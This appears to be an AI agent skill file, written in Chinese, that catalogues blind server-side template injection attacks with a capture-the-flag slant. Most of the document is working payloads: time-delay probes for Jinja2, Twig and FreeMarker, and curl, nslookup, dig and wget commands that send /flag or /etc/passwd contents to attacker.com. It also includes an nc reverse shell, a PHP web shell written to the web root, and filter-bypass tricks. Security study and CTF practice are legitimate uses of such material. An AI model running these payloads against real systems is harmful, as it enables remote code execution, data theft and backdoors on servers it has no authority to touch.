---
name: 盲ssti攻击
description: Use when encountering 无回显的服务端模板注入技术 - 时间外带、dns外带、oob攻击链
---

# 盲SSTI攻击

## Info

- **Domain**: web
- **Tags**: web, ssti, blind, oob, time-based

技术

## 核心概念
盲SSTI指模板注入后结果不回显，需要通过侧信道获取数据。

## 攻击方式

### 1. 时间盲注 (Time-Based)
利用延时函数判断注入是否成功。

**Jinja2时间盲注：**
```python
# 基础探测 - 如果延时3秒则存在SSTI
{{ ''.__class__.__mro__[2].__subclasses__()[132].__init__.__globals__['os'].popen('sleep 3').read() }}

# 无数字绕过版本
{{ lipsum.__globals__['os'].popen('sleep ' + '3').read() }}

# 条件延时
{% if lipsum.__globals__['os'].popen('sleep 3').read() %}{% endif %}

# 使用request对象
{{ request.__class__.__mro__[1].__subclasses__() | length }}
{{ cycler.__init__.__globals__.os.popen('sleep 3').read() }}
```

**Twig时间盲注：**
```php
{{ ''|reverse|reverse~''|draw }}

# 延时探测
{% if true %}{{ ''|slice(0, 0)~system('sleep 3') }}{% endif %}
```

**FreeMarker时间盲注：**
```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("sleep 3") }
```

### 2. DNS外带 (DNS Exfiltration)

**Jinja2 DNS外带：**
```python
# 基础DNS请求
{{ lipsum.__globals__['os'].popen('curl http://attacker.com/$(whoami)').read() }}

# 带数据外带
{{ lipsum.__globals__['os'].popen('nslookup $(whoami).attacker.com').read() }}

# 读取文件并外带
{{ lipsum.__globals__['os'].popen('curl http://attacker.com/$(cat /flag | base64)').read() }}

# 使用dig
{{ ''.__class__.__mro__[2].__subclasses__()[132].__init__.__globals__['os'].popen('dig $(cat /flag).attacker.com').read() }}
```

**无数字DNS外带：**
```python
# 绕过数字过滤
{{ lipsum.__globals__['os'].popen('curl http://attacker.com/$(cat /etc/passwd | head -c 100 | xxd -p)').read() }}

# 使用字符串拼接代替数字
{{ ().__class__.__bases__[()].__subclasses__()[lipsum|length].__init__.__globals__['os'].popen('id').read() }}
```

### 3. HTTP外带

```python
# curl外带
{{ lipsum.__globals__['os'].popen('curl -d "$(cat /flag)" http://attacker.com/').read() }}

# wget外带
{{ lipsum.__globals__['os'].popen('wget --post-data="$(cat /flag)" http://attacker.com/').read() }}

# nc外带
{{ lipsum.__globals__['os'].popen('nc attacker.com 4444 -e /bin/sh').read() }}
```

### 4. 文件写入 + 访问验证

```python
# 写入WebShell
{{ lipsum.__globals__['os'].popen('echo "<?php system($_GET[c]);?>" > /var/www/html/shell.php').read() }}

# 写入成功后访问验证
# 访问 http://target/shell.php?c=id
```

## 无数字/无%绕过技巧

### 字符串拼接代替数字
```python
# 获取数字
{{ lipsum|length }}  # 返回某个数字
{{ ().__class__.__bases__|length }}  # 获取基数

# 使用索引
{{ ().__class__.__bases__[()].__subclasses__()[lipsum|length] }}
```

### 使用attr过滤器
```python
{{ lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')() }}
```

### 使用request对象
```python
{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('open')('/etc/passwd')|attr('read')() }}
```

### 使用cycler对象
```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

## Python沙箱绕过

### 常见过滤绕过
```python
# 过滤了config
{{ self.__init__.__globals__['config'] }}

# 过滤了class
{{ ''['__class__'].__mro__[2]['__subclasses__']() }}

# 过滤了引号
{{ request.args.a }}  # 通过URL参数传入
?a=__class__

# 过滤了下划线
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}

# 过滤了中括号
{{ ''.__class__.__mro__.__getitem__(2) }}

# 过滤了点
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(2) }}
```

## FastAPI/Jinja2 特殊技巧

```python
# 通过app对象获取
{{ app.__class__.__mro__[1].__subclasses__() }}

# FastAPI特有
{{ app.router.routes }}
{{ app.__dict__ }}

# 获取环境变量
{{ lipsum.__globals__['os'].environ['FLAG'] }}
```

## 攻击链示例

### 完整盲SSTI攻击流程
```
1. 探测是否存在SSTI - 时间盲注
2. 确定模板引擎类型 - 不同语法
3. 构造无回显payload - DNS/HTTP外带
4. 绕过WAF过滤 - 编码/拼接
5. 获取Flag - 文件读取/命令执行
```

## Burp Collaborator / DNSLog

```python
# 使用DNSLog平台
{{ lipsum.__globals__['os'].popen('curl http://xxx.dnslog.cn/$(whoami)').read() }}

# 使用Burp Collaborator
{{ lipsum.__globals__['os'].popen('nslookup $(whoami).xxx.burpcollaborator.net').read() }}
```